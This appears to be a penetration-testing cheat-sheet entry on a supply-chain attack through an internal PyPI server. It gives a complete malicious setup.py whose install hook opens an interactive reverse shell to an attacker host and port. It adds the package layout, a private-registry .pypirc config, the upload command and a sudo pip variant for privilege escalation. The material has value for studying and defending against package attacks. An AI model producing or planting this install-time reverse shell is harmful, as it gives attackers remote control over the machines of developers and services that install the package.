# Malicious PyPI Package (setup.py RCE)

When a cron or user runs `pip install` from a local/internal PyPI server — inject a reverse shell via `setup.py`.

**Malicious setup.py:**
```python
import os, socket, subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('<LHOST>', <LPORT>))
        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])

setup(name='revshell', version='0.0.1', cmdclass={'install': Exploit})
```

**Package structure:**
```
revshell/
  setup.py
  revshell/__init__.py   # empty
  setup.cfg              # empty
  README.md              # empty
```

**Configure ~/.pypirc for private registry:**
```ini
[distutils]
index-servers = internal

[internal]
repository: http://<PYPI-SERVER>/
username: <user>
password: <pass>
```

**Build and upload:**
```bash
python setup.py sdist upload -r internal
```

**Also works for sudo pip (GTFOBins):**
```bash
sudo pip install . --extra-index-url http://<INTERNAL-PYPI>/
```
